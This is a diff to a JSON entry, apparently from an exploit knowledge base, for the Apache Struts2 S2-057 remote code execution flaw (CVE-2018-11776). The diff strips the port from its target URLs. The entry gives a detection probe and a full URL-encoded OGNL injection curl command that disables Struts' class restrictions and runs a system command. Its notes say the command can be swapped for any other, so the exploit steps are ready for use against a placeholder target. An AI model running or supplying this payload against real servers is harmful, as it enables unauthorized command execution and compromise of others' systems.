@@ -27,24 +27,24 @@
     "/struts2-showcase/{namespace}/actionChain1.action",
     "/showcase/"
   ],
-  "detection_method": "发送GET请求到http://{TARGET}:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action，检查响应头中的Location字段是否包含54289（即233*233的结果），若包含则漏洞存在。",
+  "detection_method": "发送GET请求到http://{TARGET}/struts2-showcase/$%7B233*233%7D/actionChain1.action，检查响应头中的Location字段是否包含54289（即233*233的结果），若包含则漏洞存在。",
   "exploit_steps": [
     {
       "step": 1,
       "description": "检测漏洞是否存在，通过OGNL表达式计算233*233。",
-      "command": "curl -v 'http://{TARGET}:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action'",
+      "command": "curl -v 'http://{TARGET}/struts2-showcase/$%7B233*233%7D/actionChain1.action'",
       "expected_result": "响应头Location字段包含54289。",
       "notes": "确保目标运行在8080端口，且路径正确。"
     },
     {
       "step": 2,
       "description": "利用漏洞执行任意命令，例如执行id命令并获取输出。",
-      "command": "curl -v 'http://{TARGET}:8080/struts2-showcase/$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('id')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action'",
+      "command": "curl -v 'http://{TARGET}/struts2-showcase/$%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('id')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action'",
       "expected_result": "响应中包含id命令的输出，如uid=...。",
       "notes": "payload已URL编码，可替换exec('id')中的命令为其他系统命令。"
     }
   ],
-  "verification_command": "curl -v 'http://{TARGET}:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action'",
+  "verification_command": "curl -v 'http://{TARGET}/struts2-showcase/$%7B233*233%7D/actionChain1.action'",
   "verification_success_sign": "响应头Location字段包含54289。",
   "requires_callback": false,
   "callback_note": "此漏洞不需要目标回连攻击机，可直接通过OGNL表达式执行命令并获取输出。",
@@ -56,7 +56,7 @@
     "cve-2018-11776",
     "remote-code-execution"
   ],
-  "search_text": "Struts2 S2-057远程代码执行漏洞，当配置满足alwaysSelectFullNamespace为true且action未设置namespace或使用通配符时，用户传入的namespace作为OGNL表达式执行，导致任意命令执行。 expression_injection CVE-2018-11776 Struts2 S2-057 CVE-2018-11776 Struts 2.3.34 Struts 2.5.16 OGNL alwaysSelectFullNamespace Struts2 showcase actionChain1 Location header OGNL expression 发送GET请求到http://{TARGET}:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action，检查响应头中的Location字段是否包含54289（即233*233的结果），若包含则漏洞存在。 <= Struts 2.3.34, <= Struts 2.5.16 struts2 rce ognl cve-2018-11776 remote-code-execution 检测漏洞是否存在，通过OGNL表达式计算233*233。 利用漏洞执行任意命令，例如执行id命令并获取输出。",
+  "search_text": "Struts2 S2-057远程代码执行漏洞，当配置满足alwaysSelectFullNamespace为true且action未设置namespace或使用通配符时，用户传入的namespace作为OGNL表达式执行，导致任意命令执行。 expression_injection CVE-2018-11776 Struts2 S2-057 CVE-2018-11776 Struts 2.3.34 Struts 2.5.16 OGNL alwaysSelectFullNamespace Struts2 showcase actionChain1 Location header OGNL expression 发送GET请求到http://{TARGET}/struts2-showcase/$%7B233*233%7D/actionChain1.action，检查响应头中的Location字段是否包含54289（即233*233的结果），若包含则漏洞存在。 <= Struts 2.3.34, <= Struts 2.5.16 struts2 rce ognl cve-2018-11776 remote-code-execution 检测漏洞是否存在，通过OGNL表达式计算233*233。 利用漏洞执行任意命令，例如执行id命令并获取输出。",
   "embedding": [
     0.11067453026771545,
     -0.053947564214468,
